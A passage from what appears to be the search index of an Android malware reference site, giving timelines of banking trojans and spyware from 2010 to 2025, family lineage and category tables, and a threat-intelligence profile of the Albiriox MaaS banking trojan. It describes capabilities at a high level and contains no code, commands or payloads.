cert) Operator identity, potentially shared across campaigns Inject kit style and target list Regional focus, possible inject kit vendor (InTheBox) Packer/obfuscation choice Developer preference, budget (commercial vs. free packers) Telegram channel artifacts Developer identity, customer base, operational schedule Language artifacts in code/panel Developer origin (Russian strings, Chinese comments, Farsi UI) Distribution pattern Operator methodology (smishing vs. Play Store vs. social engineering) Target list (banking apps) Geographic and financial sector focus of the operator Monetization method Mule networks suggest organized crime; data exfiltration suggests espionage"},{"location":"malware/threat-actors/#key-research-sources","title":"Key Research Sources","text":"Source Coverage ThreatFabric MaaS families, developer tracking, underground market monitoring Cleafy Italian/European banking trojans, vishing operations Citizen Lab Commercial spyware, state-sponsored surveillance Google TAG Zero-day exploitation, APT Android campaigns ESET Broad family coverage, APT campaigns Check Point RAT ecosystem, open-source tool tracking Kaspersky GReAT APT campaigns, particularly Russia/CIS-adjacent Cyble Underground monitoring, MaaS pricing Lookout Mobile APT, commercial spyware"},{"location":"malware/timeline/","title":"Android Malware Timeline","text":"<p>A chronological overview of Android malware evolution, from proof-of-concept trojans to sophisticated banking malware with automated fraud capabilities. Each era introduced techniques that became standard in later families.</p>"},{"location":"malware/timeline/#2010-2012-early-stage","title":"2010-2012: Early Stage","text":"<p>The Android malware landscape begins. Threats are simple, mostly SMS fraud and basic trojans.</p> Year Family Significance 2010 FakePlayer First known Android malware. Sent premium SMS messages. 2010 Geinimi First Android botnet. C2 communication, app repackaging for distribution. 2011 DroidDream First large-scale Play Store infection. Exploited root vulnerabilities (exploid, rageagainstthecage). ~250k downloads before removal. 2011 DroidKungFu Root exploit + payload download. Embedded encrypted payload decrypted at runtime. 2011 Plankton Aggressive adware framework. Demonstrated large-scale data harvesting without root. 2012 NotCompatible TCP proxy on infected devices. Used for click fraud and ticket scalping. <p>Defining techniques: premium SMS fraud, root exploits, app repackaging, basic C2.</p>"},{"location":"malware/timeline/#2013-2015-ransomware-and-banking","title":"2013-2015: Ransomware and Banking","text":"<p>Banking trojans emerge. Ransomware arrives on mobile. Distribution through social engineering improves.</p> Year Family Significance 2013 Obad Most sophisticated to date: exploited device admin, SMS distribution, proxy chaining. 2013 Svpeng First mobile banking trojan to combine phishing overlays with SMS interception. 2014 Simplocker First Android ransomware with actual file encryption (AES). 2014 GM Bot Pioneered overlay attacks for credential theft. Source code leaked in 2016, spawning many variants. 2014 Koler Police-themed lockscreen ransomware. Used WebView for ransom display. 2015 SlemBunk Targeted 33 banking apps across multiple countries using overlays. <p>Defining techniques: overlay attacks invented, device admin abuse, file encryption, SMS-based spreading.</p>"},{"location":"malware/timeline/#2016-2018-overlay-era","title":"2016-2018: Overlay Era","text":"<p>Overlay-based banking trojans become the dominant threat. Malware-as-a-service appears.</p> Year Family Significance 2016 BankBot Open-source banking trojan. Lowered the entry barrier for banking malware. Multiple Play Store appearances. 2016 Exobot Major MaaS banking trojan. Evolved into ExobotCompact/Octo. 2016 Marcher Major banking trojan targeting European banks. WebView-based overlays, credit card phishing. 2016 HummingBad 10M+ infections. Root exploits, ad fraud, app installation. Generated $300k/month in ad revenue. 2016 Triada Zygote-injecting trojan, later found pre-installed in firmware. System-level compromise. 2016 SpyNote Free RAT builder. Lowered barrier to entry for mobile surveillance. 2017 Red Alert 2.0 MaaS banking trojan. Telegram-based C2, blocklisted legitimate banking app notifications. 2017 LokiBot Banking trojan that transforms into ransomware if user tries to remove admin rights. 2017 Joker Premium subscription fraud via accessibility. Repeatedly bypassed Play Protect, thousands of Play Store variants over its lifetime. 2018 Anubis Full-featured banking trojan: overlays, keylogging, screen recording, file encryption. Repeatedly found on Play Store. 2018 MoqHao Roaming Mantis smishing operation. DNS hijacking, SMS propagation, targeting East Asia. <p>Defining techniques: WebView inject kits, MaaS model, Play Store infiltration via droppers, Telegram C2, supply chain compromise.</p>"},{"location":"malware/timeline/#2018-2020-accessibility-takeover","title":"2018-2020: Accessibility Takeover","text":"<p>Accessibility service becomes the primary weapon. Malware shifts from stealing credentials to controlling devices.</p> Year Family Significance 2018 Gustuff First \"automatic transfer system\" (ATS): used accessibility to fill banking app forms and initiate transfers without user interaction. 2019 Cerberus Major MaaS operation. Overlays, keylogging, 2FA theft, accessibility-based permission escalation. Source leaked in September 2020. 2019 Hydra Persistent MaaS banking trojan with broad affiliate network. TOR-based C2. 2019 BRATA Brazilian RAT with banking fraud and factory reset for evidence destruction. 2020 Alien Built on leaked Cerberus code. Added notification sniffer for 2FA codes, targeting expanded to 226 apps. 2020 FluBot SMS worm: spread by sending phishing SMS to victim's contacts. Rapid pan-European spread. Dismantled by Europol in 2022. 2020 Ermac Forked from Cerberus. Targeted 467 banking and crypto apps. Rented at $3k/month. 2020 GriftHorse Premium SMS fraud at scale. 10M+ victims, 200+ trojanized Play Store apps. 2020 Medusa Screen streaming + keylogging MaaS. Shared infrastructure with FluBot. <p>Defining techniques: ATS fraud, accessibility-based device control, Cerberus source leak spawning new families, SMS worm distribution.</p>"},{"location":"malware/timeline/#2021-2023-on-device-fraud","title":"2021-2023: On-Device Fraud","text":"<p>Full device control becomes standard. VNC-like capabilities. Malware operates banking apps directly.</p> Year Family Significance 2021 Anatsa ATS-focused banker. Play Store droppers with delayed payload delivery. Targeted European banks. 2021 SharkBot ATS without overlay: directly manipulates banking app UI via accessibility. DGA for C2 resilience. 2021 Vultur First banker to use VNC screen streaming (AlphaVNC) instead of overlays. 2021 Copybara Italian-focused banker distributed via vishing (TOAD). Evolved from BRATA. 2022 Xenomorph Three generations. v3 added full ATS framework with scripting engine for automating fraud across different banking apps. 2022 Hook Evolved from Ermac. Added VNC-like remote access, file manager, WhatsApp message exfiltration. MaaS at $7k/month. 2022 Octo Remote access via screen streaming + accessibility control. Lineage traces back to Exobot (2016). 2022 GodFather Anubis successor with dynamic overlays, 400+ targets, post-Soviet language kill switch. 2022 Fakecalls Korean banker intercepting outgoing calls to real bank numbers, replacing with recorded IVR audio. 2022 PixPirate Targets Brazil's Pix instant payment system. Invisible in app drawer. 2022 Zanubis Peruvian banking trojan targeting 40+ local financial apps with overlay attacks. 2023 Chameleon Banking trojan with biometric prompt bypass to force PIN entry for capture. 2023 Goldoson Malicious SDK in 60+ Play Store apps, 100M+ installs. Data harvesting + click fraud. 2023 FluHorse Flutter-based credential stealer targeting East Asia. Dart AOT compilation in <code>libapp.so</code> defeats standard Android decompilers. 2023 GoldDigger/GoldFactory Targeted Vietnamese and Thai banks. Variants include GoldPickaxe which collects facial biometric data to bypass bank face-verification. 2023 SpyNote/CypherRat Source code leak caused surge in global deployments. Evolved from RAT to banking trojan with overlays. <p>Defining techniques: VNC-like control, ATS scripting engines, anti-forensic device wipes, biometric data theft, biometric bypass, MaaS pricing escalation.</p>"},{"location":"malware/timeline/#2024-present-evolved-threats","title":"2024-Present: Evolved Threats","text":"<p>Continued sophistication. Multi-stage dropper chains. Geographic expansion. Reduced permission footprints to evade detection.</p> Year Family Significance 2024 Gigabud GoldFactory group. Screen recording instead of overlay attacks. Shared infrastructure with SpyNote, both Virbox-packed. 2024 Anatsa v2 Expanded to US banks. Multi-stage dropper chains using accessibility to bypass Android 13 restricted settings. 2024 Vultur v2 Added screen recording, remote access, file download/upload, app blocking. Uses encrypted C2 via Firebase Cloud Messaging. 2024 Octo 2 Major update: improved remote control stability, anti-analysis techniques, domain generation algorithm (DGA) for C2. 2024 Medusa v2 Reduced permission footprint from 21 to 5 permissions. Added dead drop resolvers on Telegram and X. 2024 ToxicPanda Evolved from TgToxic (Southeast Asia). Expanded to EU and Latin America. Chinese-speaking threat actor. 2024 Mamont Most active banking trojan of 2024 (36.70% of detections). Russia-exclusive, fake parcel-tracking distribution. 2024 Necro Supply chain trojan via compromised Coral SDK. 11M+ installs on Google Play. Steganographic payload delivery. 2024 MoqHao v2024 Auto-execution without user interaction. Runs immediately after installation. 2024 SparkCat First OCR-based stealer on both Play Store and App Store. Scans photos for crypto seed phrases. 2024 SpyAgent 280+ fake apps using OCR to steal crypto seed phrases from Korean users' photos. 2024 SoumniBot Korean banker exploiting manifest parsing differences to evade static analysis tools. 2024 SpyLoan Predatory loan apps, 8M+ installs, 75% infection increase Q2-Q3 2024. Data weaponized for extortion. 2024 Mandrake v2 Returned to Play Store undetected for 2 years with OLLVM-obfuscated native libraries. 2024 NGate First Android NFC relay malware. Clones payment cards via NFCGate for ATM cash withdrawal. Czech Republic campaign. 2024 BingoMod Banking trojan with VNC-based DTO and BRATA-like post-fraud device wipe. Romanian-speaking attribution. 2024 Brokewell Full device takeover banker by \"Baron Samedit Marais.\" Rapid development cycle. 2024 GoldPickaxe GoldFactory group. Captures facial biometric data to create deepfakes for bypassing bank face-verification. 2024 Antidot Multi-language banking trojan with 35 commands. AppLite variant targets corporate employees. 2024 BlankBot Turkish-focused banker with custom keyboard keylogging. Under active development when discovered. 2024 TrickMo TrickBot companion resurfaces independently. Fake lockscreen captures device PINs. 40+ C2 variants. 2024 Rafel RAT Open-source Android RAT used in 120+ campaigns. Includes ransomware capability. APT-C-35 usage. 2025 Frogblight Turkish banker with custom keyboard keylogging. Geofencing avoids US detection. 2025 Crocodilus Full DTO with contact list injection. Adds fake \"Bank Support\" contacts for vishing. 8-country targeting. 2025 Herodotus MaaS banker by \"K1R0.\" Types with natural delays to evade behavioral biometrics during DTO. 2025 Sturnus Reads decrypted WhatsApp/Telegram/Signal messages via accessibility. Southern/Central European banks. 2025 RatOn First family combining NFC relay with ATS. Automates full card cloning and transfer fraud. 2025 Klopatra Virbox-packed Turkish banker. Operators execute ODF attacks while victims sleep. 2025 Albiriox Budget MaaS ($650-720/month) by \"MECipher.\" 400+ targets, unencrypted TCP C2. 2025 GodFather v3 On-device virtualization: installs real banking apps inside sandbox, intercepts all interactions. 2025 BTMOB RAT MaaS RAT evolved from CraxRAT/SpySolr. WebView injection, Media Projection streaming. $5k-$10k pricing. 2025 FireScam Info-stealer via fake RuStore/Telegram Premium. Firebase for both C2 and data exfiltration. Russian-targeting. 2025 DeVixor Iranian banking RAT with ransomware. 700+ samples. TRON crypto ransom payments. 2025 Hook v3 107 commands. Ransomware overlays, NFC payment card overlays, transparent gesture capture. 2025 TsarBot 750+ app targets across banking, crypto, social media. WebSocket C2, fake lockscreen PIN capture. 2025 Zanubis Peruvian banker evolved to impersonate SUNAT tax authority. 40+ banking app targets."},{"location":"malware/timeline/#spyware-timeline","title":"Spyware Timeline","text":"<p>Commercial spyware operates on a separate track from financially-motivated malware, with different distribution, capabilities, and targets.</p> Year Family Significance 2012 FinSpy FinFisher GmbH's commercial lawful intercept. Sold to governments globally. Heavily obfuscated. 2014 FinSpy leaked Phineas Fisher hack exposed 40GB of FinFisher data including source code. 2016 Pegasus NSO Group. Trident exploit chain discovered via Ahmed Mansoor. Zero-click capability. 2017 EagleMsgSpy Chinese law enforcement surveillance tool by Wuhan Chinasoft Token. Physical access install, chat app interception. 2019 Hermit RCS Lab. Distributed via ISP-level network injection. Modular architecture. 2020 LightSpy APT41 (Chinese state). Modular surveillance with 14+ plugins. Cross-platform (Android/iOS/macOS/Windows). Watering hole delivery. 2019 Predator Cytrox/Intellexa. Exploit chain delivery. Alien loader + Predator implant architecture. 2021 Pegasus Project Forbidden Stories investigation revealed 50,000+ potential surveillance targets across governments. 2022 Predator exploits Google TAG documented five zero-day exploits (four Chrome, one Android kernel) used by Predator. 2022 FinFisher bankrupt German investigation into unauthorized exports led to company insolvency. 2023 Predator Files Amnesty/EIC investigation: Predator sold to 25+ countries. 2024 Intellexa sanctioned U.S. Treasury sanctions against Intellexa consortium. 2021 BoneSpy Sandcat (Uzbekistan SSS). DroidWatcher-based surveillanceware targeting Central Asian former Soviet states. 2024 AridSpy Arid Viper (APT-C-23). Multi-stage trojanized messaging apps targeting Palestine and Egypt. 2024 PlainGnome Sandcat. Custom-built two-stage dropper. Screen-off audio recording bypasses Android microphone indicator. 2024 GuardZoo Houthi-aligned. Modified Dendroid RAT targeting Middle Eastern military. 450+ victims since 2019. 2025 KoSpy DPRK (ScarCruft/APT37). Firebase Firestore C2. Plugin-based surveillance on Google Play. 2024 PJobRAT Resurfaces targeting Taiwan military via fake messaging apps. Dual HTTP/WebSocket C2. 2021 DCHSpy MuddyWater/MOIS Android surveillanceware. Fake VPN/StarLink lures targeting Iranian dissidents. SFTP exfiltration."},{"location":"malware/timeline/#technique-adoption-timeline","title":"Technique Adoption Timeline","text":"<p>Shows when key techniques first appeared and became standard:</p> Technique Introduced Became Standard First Used By Premium SMS fraud 2010 2010-2012 FakePlayer Root exploits 2011 2011-2013 DroidDream Overlay attacks 2014 2016-2018 GM Bot Device admin abuse 2013 2014-2016 Obad Accessibility abuse 2018 2019-2020 Gustuff ATS (auto-transfers) 2018 2021-2022 Gustuff SMS worm distribution 2020 2020-2021 FluBot Play Store droppers 2016 2020+ BankBot VNC-like control 2021 2022-2023 Vultur, Octo Anti-forensic wipe 2021 Uncommon BRATA Biometric bypass 2023 Rare Chameleon Biometric theft 2023 Rare GoldPickaxe Reduced permissions 2024 Emerging Medusa v2 OCR-based theft 2024 Emerging SparkCat, SpyAgent Manifest obfuscation 2024 Rare SoumniBot Auto-execution on install 2024 Rare MoqHao Custom keyboard keylogging 2025 Rare Frogblight Steganographic payloads 2024 Rare Necro SDK supply chain 2023 Growing Goldoson, Necro NFC relay 2024 Emerging NGate On-device virtualization 2025 Rare GodFather v3 Human behavior mimicry 2025 Rare Herodotus Encrypted messaging interception 2025 Rare Sturnus Contact list injection 2025 Rare Crocodilus NFC relay + ATS combo 2025 Rare RatOn Commercial packer abuse 2025 Emerging Klopatra, Gigabud Fake lockscreen PIN capture 2024 Emerging TrickMo, TsarBot Firebase C2 config delivery 2022 Emerging KoSpy, PJobRAT Corporate employee targeting 2024 Rare Antidot/AppLite Clipboard hijacking 2019 Standard Cerberus Firebase C2/exfiltration 2022 Emerging KoSpy, FireScam Voice call interception 2022 Rare Fakecalls SFTP exfiltration 2021 Rare DCHSpy Predatory lending extortion 2020 Growing SpyLoan Flutter/Dart framework abuse 2023 Rare FluHorse Screen-off audio recording 2024 Rare PlainGnome"},{"location":"malware/timeline/#law-enforcement-actions","title":"Law Enforcement Actions","text":"Year Event Impact 2020 Cerberus source code leaked Spawned Alien, Ermac, Hook lineage. Single most impactful code leak in Android malware history. 2021 Europol takes down Flubot Operation coordinated across 11 countries. Infrastructure seized, suspects arrested. 2022 FinFisher declares bankruptcy German investigation into unauthorized exports of surveillance tools. 2024 Intellexa/Cytrox sanctioned U.S. Treasury sanctions against Predator spyware consortium. 2024 Anubis/Medusa infrastructure disruption Multiple C2 domains seized through coordinated takedowns. 2025 Hook operators arrested Several affiliates arrested in Europe through ThreatFabric intelligence sharing with law enforcement."},{"location":"malware/families/","title":"Malware Families","text":"<p>Individual write-ups on notable Android malware families. Each entry documents origin, capabilities, distribution, target regions, C2 infrastructure, and links to primary research from the teams who analyzed them.</p> <p>Families are grouped by primary function. Many overlap categories (a banking trojan may also be spyware). The primary classification reflects their main operational purpose. For how different vendors name the same family, see Naming Conventions. For chronological evolution, see Timeline.</p>"},{"location":"malware/families/#lineage-map","title":"Lineage Map","text":"<p>Several families share code lineage. Understanding these relationships is critical for attribution and capability prediction.</p> <pre><code>BankBot (2016) \u2500\u2500\u25ba Anubis (2017) \u2500\u2500\u25ba GodFather (2022)\n\nCerberus (2019) \u2500\u2500\u25ba Alien (2020) \u2500\u2500\u25ba Ermac (2021) \u2500\u2500\u25ba Hook (2023)\n\nExobot (2016) \u2500\u2500\u25ba ExobotCompact/Coper (2021) \u2500\u2500\u25ba Octo (2022)\n                                                \u2500\u2500\u25ba Frogblight (2025)?\n\nBRATA (2019) \u2500\u2500\u25ba Copybara (2021)\n\nTgToxic (2022) \u2500\u2500\u25ba ToxicPanda (2024)\n\nCraxRAT \u2500\u2500\u25ba SpySolr \u2500\u2500\u25ba BTMOB RAT (2025)\n</code></pre>"},{"location":"malware/families/#banking-trojans","title":"Banking Trojans","text":"<p>The largest and most actively developed category. Modern banking trojans combine overlay injection, accessibility abuse, and ATS (Automated Transfer Systems) for on-device fraud.</p>"},{"location":"malware/families/#cerberus-lineage","title":"Cerberus Lineage","text":"Family Active Origin Key Innovation Cerberus 2019-2020 MaaS Source leak spawned Alien, Ermac, Hook ecosystem Alien 2020-2021 Cerberus fork Added notification sniffing, TeamViewer remote access Ermac 2021-2022 Cerberus/Alien fork Refined codebase, 467 overlay targets Hook 2023-present Ermac fork VNC, RAT, ATS in single package"},{"location":"malware/families/#anubis-lineage","title":"Anubis Lineage","text":"Family Active Origin Key Innovation BankBot 2016-2018 Open source First widely accessible banking trojan source code Anubis 2017-2020 BankBot evolution Overlay + keylogger + ransomware combo GodFather 2022-present Anubis evolution Dynamic overlays, 400+ targets"},{"location":"malware/families/#exobot-lineage","title":"Exobot Lineage","text":"Family Active Origin Key Innovation Octo 2022-present ExobotCompact/Coper Remote access via screen streaming Frogblight 2025-present Possible Coper connection Custom keyboard keylogging, Turkish focus"},{"location":"malware/families/#independent","title":"Independent","text":"Family Active Origin Key Innovation Albiriox 2025-present MaaS Budget MaaS ($650-720/month), 400+ targets, unencrypted TCP C2 Anatsa 2021-present Independent ATS fraud pioneer on Google Play, targets EU banking Antidot 2024-present Independent Multi-language overlays, VNC, AppLite corporate variant BingoMod 2024-present Independent Post-fraud device wipe, VNC-based DTO BRATA 2019-2022 Independent Factory reset after fraud, evidence destruction Brokewell 2024-present Independent Rapid development cycle, \"Baron Samedit Marais\" Chameleon 2023-present Independent Biometric prompt bypass to force PIN capture Copybara 2021-present BRATA evolution Italian-focused, TOAD delivery via vishing Crocodilus 2025-present Independent Contact list injection, full DTO, 8-country targeting Gigabud 2022-present GoldFactory Screen recording instead of overlays, shared infrastructure with SpyNote GoldPickaxe 2023-present GoldFactory Facial biometric theft for deepfake bank verification bypass Gustuff 2018-2020 Independent Early ATS implementation via accessibility Herodotus 2025-present MaaS Human behavior mimicry during device takeover Hydra 2019-present MaaS Persistent MaaS operation, wide affiliate network Medusa 2020-present MaaS Screen streaming, keylogging, broad targeting NGate 2024 Independent First NFC relay malware, clones payment cards for ATM withdrawal PixPirate 2022-present Independent Targets Brazil's Pix instant payment system RatOn 2025-present Independent First to combine NFC relay with ATS SharkBot 2021-present Independent ATS + DGA + dropper-on-Play pipeline Sturnus 2025-present Independent Encrypted messaging interception via accessibility ToxicPanda 2024-present TgToxic evolution EU/LATAM expansion, Chinese-speaking actor TrickMo 2019-present TrickBot companion Fake lockscreen PIN capture, 40+ C2 variants TsarBot 2025-present Independent 750+ app targets, WebSocket C2, fake lockscreen Vultur 2021-present Independent Screen streaming over overlays, AlphaVNC Xenomorph 2022-present Independent Rapid feature iteration, ATS engine"},{"location":"malware/families/#regional-banking-trojans","title":"Regional Banking Trojans","text":"Family Active Region Key Innovation Fakecalls 2022-present South Korea Voice call interception, IVR impersonation FluHorse 2022-present East Asia (Taiwan, Vietnam) Flutter-based, Dart AOT in libapp.so defeats standard decompilers Frogblight 2025-present Turkey Custom keyboard keylogging, geofencing BlankBot 2024-present Turkey Custom keyboard keylogging, under active development Klopatra 2025-present Turkey Virbox packer, nighttime ODF attacks Mamont 2024-present Russia Highest-volume banker in 2024, notification interception SoumniBot 2024-present South Korea Novel manifest obfuscation techniques DeVixor 2025-present Iran Banking RAT with ransomware, 700+ samples, TRON ransom payments Zanubis 2022-present Peru Government (SUNAT) impersonation"},{"location":"malware/families/#sms-and-toll-fraud","title":"SMS and Toll Fraud","text":"<p>Monetize through premium SMS, WAP billing, or subscription fraud. Often distributed through Google Play using dropper techniques.</p> Family Active Key Innovation Joker 2017-present Most persistent Play Store threat, thousands of variants FluBot 2020-2022 SMS worm with explosive spread, law enforcement takedown Harly 2020-present Subscription fraud via invisible WebView GriftHorse 2020-2021 Premium SMS at scale, 10M+ victims"},{"location":"malware/families/#smishing-and-distribution","title":"Smishing and Distribution","text":"<p>Families whose primary capability is SMS-based propagation and phishing delivery.</p> Family Active Key Innovation MoqHao 2018-present Longest-running mobile smishing operation, auto-execution (2024)"},{"location":"malware/families/#spyware-and-surveillance","title":"Spyware and Surveillance","text":"<p>Commercial or state-sponsored implants designed for targeted surveillance. Distinct from banking trojans in purpose (intelligence collection vs financial theft) and distribution (targeted delivery vs mass campaigns).</p> Family Active Operator Key Capability Pegasus 2016-present NSO Group (Israel) Zero-click exploits, full device compromise Predator 2019-present Cytrox/Intellexa (EU) Exploit chain delivery, modular implant FinSpy 2012-2022 FinFisher (Germany) Commercial lawful intercept, heavily obfuscated Hermit 2019-present RCS Lab (Italy) ISP-level delivery via network injection KoSpy 2022-present ScarCruft/APT37 (DPRK) Firebase Firestore C2 config, plugin-based surveillance LightSpy 2020-present APT41 (China) 14+ plugin modular framework, WeChat Pay theft, cross-platform AridSpy 2024-present Arid Viper/APT-C-23 (Palestinian) Multi-stage trojanized messaging apps BoneSpy 2021-present Sandcat (Uzbekistan SSS) DroidWatcher-based, SMS command control EagleMsgSpy 2017-present Chinese public security bureaus Lawful intercept, physical access install, chat app interception GuardZoo 2019-present Houthi-aligned (Yemen) Military GPS/mapping file collection, 450+ victims Mandrake 2016-present Unknown Multi-year Play Store presence, OLLVM obfuscation DCHSpy 2021-present MuddyWater/MOIS (Iran) VPN/StarLink lures, SFTP exfiltration, targets Iranian dissidents PlainGnome 2024-present Sandcat (Uzbekistan SSS) Custom-built, two-stage dropper, screen-off audio recording"},{"location":"malware/families/#cryptocurrency-stealers","title":"Cryptocurrency Stealers","text":"<p>Families targeting cryptocurrency wallets through OCR-based seed phrase theft from device photos.</p> Family Active Key Innovation SparkCat 2024-present First OCR stealer on both Play Store and App Store SpyAgent 2024-present 280+ fake apps, OCR seed phrase theft targeting Korea"},{"location":"malware/families/#supply-chain-and-sdk-malware","title":"Supply Chain and SDK Malware","text":"<p>Malicious code distributed through compromised SDKs or pre-installed in firmware.</p> Family Active Key Innovation Triada 2016-present Pre-installed in firmware, modular, ad fraud + backdoor Necro 2024-present Steganographic payload delivery, compromised Coral SDK Goldoson 2023 100M+ installs via malicious SDK in 60+ legitimate apps"},{"location":"malware/families/#predatory-apps","title":"Predatory Apps","text":"<p>Applications that operate as malware through excessive data collection and weaponization of personal information.</p> Family Active Key Innovation SpyLoan 2020-present Predatory lending apps, data used for harassment/extortion"},{"location":"malware/families/#nfc-relay","title":"NFC Relay","text":"<p>An emerging attack category using NFC relay to clone contactless payment cards for ATM cash withdrawal or POS fraud.</p> Family Active Key Innovation NGate 2024 First Android NFC relay malware, clones cards via NFCGate RatOn 2025-present First to combine NFC relay with ATS for automated fraud"},{"location":"malware/families/#rats-remote-access-trojans","title":"RATs (Remote Access Trojans)","text":"<p>General-purpose remote access tools providing full device control without specialized financial fraud features.</p> Family Active Key Innovation BTMOB RAT 2025-present MaaS RAT, WebView injection, Media Projection screen streaming SpyNote 2016-present Free/cheap RAT builder, massive operator base Rafel RAT 2022-present Open-source RAT, 120+ campaigns, ransomware capability FireScam 2025-present Info-stealer via fake RuStore/Telegram Premium, Firebase C2 and exfiltration PJobRAT 2021-present Military-targeting RAT, India then Taiwan campaigns"},{"location":"malware/families/albiriox/","title":"Albiriox","text":"<p>Albiriox is an Android banking trojan sold as Malware-as-a-Service (MaaS), discovered by Cleafy in December 2025. Publicly offered since October 2025 at $650-720 per month, Albiriox targets over 400 applications spanning banking, cryptocurrency, fintech, wallet, trading, payments, investment, and gaming categories. The malware provides On-Device Fraud (ODF) capability through VNC remote control and uses a loader/dropper architecture with obfuscation and crypting services. Notably, its C2 communication uses unencrypted TCP, a simplistic choice relative to the sophistication of its other capabilities.</p>"},{"location":"malware/families/albiriox/#overview","title":"Overview","text":"Attribute Details First Seen September 2025 Status Active, public MaaS offering since October 2025 Type Banking trojan, MaaS, RAT Attribution Unknown Pricing $650-720/month Target Apps 400+ (banking, crypto, fintech, wallet, trading, payments, investment, gaming)"},{"location":"malware/families/albiriox/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cleafy's analysis identifies Albiriox as a new entrant in the Android MaaS ecosystem. First observed in the wild in September 2025, it was publicly advertised as a MaaS offering from October 2025 onward. No direct code lineage to existing banking trojan families has been established.</p> <p>Albiriox enters a crowded MaaS market alongside established players like Octo, Hook, and Medusa. Its pricing at $650-720/month positions it as a budget-friendly alternative compared to Hook's former $7,000/month rental price, making it accessible to lower-tier threat actors. The wide target list of 400+ applications and the inclusion of obfuscation/crypting services suggest the operators are aiming for broad market appeal rather than specialization.</p>"},{"location":"malware/families/albiriox/#distribution","title":"Distribution","text":"Vector Details Loader/dropper Multi-stage architecture separating delivery from payload Obfuscation services Crypting services offered alongside the MaaS subscription <p>Cleafy documented that Albiriox uses a loader/dropper architecture. The dropper handles initial installation and evasion, then downloads and installs the actual malicious payload. The MaaS operation includes obfuscation and crypting services, meaning operators provide their affiliates with tools to evade detection rather than leaving this to the buyer.</p> <p>This bundled approach lowers the technical barrier for affiliates: subscribers receive not just the malware but the infrastructure and tooling needed to deploy it effectively.</p>"},{"location":"malware/families/albiriox/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/albiriox/#core-features","title":"Core Features","text":"Capability Implementation VNC remote control On-Device Fraud through real-time remote access Black/blank screen Hides remote operations from the victim Volume control Mutes device audio during fraud to prevent alerting the victim Overlay injection Phishing overlays targeting 400+ applications Loader/dropper Multi-stage deployment with obfuscation Crypting services Detection evasion tooling provided to affiliates"},{"location":"malware/families/albiriox/#on-device-fraud-odf","title":"On-Device Fraud (ODF)","text":"<p>Albiriox provides ODF capability through VNC-based remote control, allowing operators to:</p> <ol> <li>View the device screen in real-time via VNC</li> <li>Navigate banking and financial apps as the legitimate user</li> <li>Initiate and approve transactions from the compromised device</li> <li>Display a black or blank screen to hide the remote session from the victim</li> <li>Control device volume to suppress notification sounds during fraud</li> </ol> <p>The black screen and volume control are specifically designed for fraud concealment. When an operator takes control, the victim sees a blank screen and hears nothing, making the device appear powered off or idle. This technique is shared with other ODF-capable families like Octo and Hook.</p>"},{"location":"malware/families/albiriox/#target-application-coverage","title":"Target Application Coverage","text":"<p>With over 400 targeted applications, Albiriox covers a broad range of financial services:</p> Category Examples Banking Traditional banking apps across multiple regions Cryptocurrency Crypto exchange and wallet apps Fintech Digital banking and neobank apps Wallet Payment wallet applications Trading Stock and forex trading platforms Payments Payment processing apps Investment Investment and portfolio management apps Gaming Gaming platforms with financial components <p>The inclusion of gaming alongside traditional financial targets reflects a growing trend in mobile malware targeting any application that stores monetary value or payment methods.</p>"},{"location":"malware/families/albiriox/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/albiriox/#c2-communication","title":"C2 Communication","text":"Component Details Protocol TCP (unencrypted) Encryption None Transport Raw TCP connections to C2 server <p>Cleafy's analysis revealed that Albiriox communicates with its C2 infrastructure over unencrypted TCP. This is a notable weakness:</p> <ul> <li>Network-level monitoring can intercept and read all C2 traffic in plaintext</li> <li>Security researchers can analyze command-and-control protocols through simple packet capture</li> <li>Enterprise network detection tools can easily identify and block the traffic</li> <li>Contrast this with families like Octo2, which uses per-request dynamic AES encryption, or FluBot, which evolved to DNS tunneling over HTTPS</li> </ul> <p>The lack of encryption may reflect rapid development prioritizing feature completeness over operational security, or an intentional choice to minimize complexity in the early stages of the MaaS operation.</p>"},{"location":"malware/families/albiriox/#loaderdropper-architecture","title":"Loader/Dropper Architecture","text":"<p>Albiriox uses a multi-stage deployment model:</p> <ol> <li>Dropper: The initial application installed on the device, appearing benign to evade detection</li> <li>Loader: Downloads and installs the actual malicious payload after the dropper establishes persistence</li> <li>Payload: The full banking trojan with VNC, overlay injection, and fraud capabilities</li> </ol> <p>The MaaS operation provides obfuscation and crypting services that process the dropper before distribution, modifying its signature to evade antivirus detection. This service model means affiliates do not need their own crypting infrastructure.</p>"},{"location":"malware/families/albiriox/#maas-infrastructure","title":"MaaS Infrastructure","text":"<p>As a full MaaS operation, Albiriox provides subscribers with:</p> <ul> <li>Builder: Generates customized APKs with affiliate-specific C2 configuration</li> <li>Panel: Web interface for managing bots, monitoring infected devices, and executing fraud</li> <li>VNC client: Real-time device access for on-device fraud</li> <li>Crypting/obfuscation: Detection evasion services bundled with the subscription</li> <li>Target list: Pre-built overlay kits covering 400+ applications</li> </ul>"},{"location":"malware/families/albiriox/#target-regions","title":"Target Regions","text":"<p>Albiriox targets a global audience through its MaaS model. With 400+ targeted applications spanning multiple financial categories and regions, the specific geographic focus depends on individual affiliates and the applications they choose to target. Cleafy's report documents the global scope of the target list, covering banking, crypto, fintech, and wallet applications across multiple countries.</p>"},{"location":"malware/families/albiriox/#notable-campaigns","title":"Notable Campaigns","text":"<p>September 2025: First Albiriox samples observed in the wild, marking the beginning of active development and testing.</p> <p>October 2025: Albiriox is publicly offered as a MaaS product at $650-720/month, entering the competitive Android banking trojan market.</p> <p>December 2025: Cleafy publishes their analysis of Albiriox, documenting its VNC-based ODF capability, 400+ target applications, unencrypted TCP C2 communication, and loader/dropper architecture with bundled crypting services.</p>"},{"location":"malware/families/albiriox/#related-families","title":"Related Families","text":"<p>Albiriox competes directly with established MaaS operations in the Android banking trojan space. Octo offers MediaProjection-based screen streaming with DGA C2 resolution. Hook provides VNC and ATS capabilities, though its source code leak in 2023 fragmented the ecosystem. Medusa combines keylogging with screen streaming across multiple affiliate groups.</p> <p>Albiriox's $650-720/month pricing significantly undercuts the historical prices of these established families (Hook at $7,000/month pre-leak, Octo at premium MaaS pricing). This aggressive pricing strategy, combined with the broad 400+ app target list and bundled crypting services, positions Albiriox as an accessible entry point for lower-budget threat actors seeking ODF capability.</p> <p>The use of unencrypted TCP for C2 communication places Albiriox at the lower end of technical sophistication for C2 protocols compared to its competitors. Whether this represents a temporary shortcut during early development or a persistent architectural decision will become clear as the family matures.</p>"},{"location":"malware/families/alien/","title":"Alien","text":"<p>Alien was the first 